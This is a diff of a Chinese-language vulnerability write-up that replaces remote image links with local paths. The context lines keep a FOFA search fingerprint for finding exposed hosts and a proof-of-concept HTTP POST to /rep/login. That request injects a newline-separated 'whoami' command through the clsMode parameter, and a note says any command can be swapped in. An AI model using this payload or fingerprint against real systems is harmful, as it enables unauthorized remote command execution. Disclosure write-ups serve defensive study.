@@ -82,7 +82,7 @@ fofa: "fid=\"iaytNA57019/kADk8Nev7g==\""
 网络测绘
 ----
 
-favicon 图标特征![](https://mmbiz.qpic.cn/sz_mmbiz_png/fZjIoPoMagxL87lh7HcwawaSsEVebeVvwH01X20mlyoQcAHDS6DmIicGz8djcFHZ92NTpaTJajkpvlE7RqpCic2A/640?wx_fmt=png)
+favicon 图标特征![](../../.resource/remote/89f4cc69b31a1a8e77e562f4a07dda3ed0533000106c46e092e954787d2ab3df.png)
 
 FOFA 网络测绘搜索
 
@@ -95,7 +95,7 @@ fid="iaytNA57019/kADk8Nev7g=="
 漏洞复现
 ----
 
-访问登录界面![](https://mmbiz.qpic.cn/sz_mmbiz_png/fZjIoPoMagxL87lh7HcwawaSsEVebeVvhUibCbfnoJopsu2XVemnO12cj6utTLia464gcO5BZVJz8f62wjicYS5Xg/640?wx_fmt=png) POC
+访问登录界面![](../../.resource/remote/fb2f8c7aeded0a48f771e8caba005dfb52d2228bb9c671905476d26340f8e51a.png) POC
 
 ```http
 POST /rep/login HTTP/1.1
@@ -124,7 +124,7 @@ clsMode=cls_mode_login%0Awhoami%0A&index=index&log_type=report&loginType=account
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/fZjIoPoMagxL87lh7HcwawaSsEVebeVvPKaNnbBFkDXQzM0rcMLG4j9icqUM3hCpWVezWtw05FQSPDeR2obuX9Q/640?wx_fmt=png)
+![](../../.resource/remote/83854e40feb1610005fca2bbae1a6fc8b6d6d307fc99b11398d33e018ead52a7.png)
 
 通过更改 %0A 中间的参数执行任意命令
 
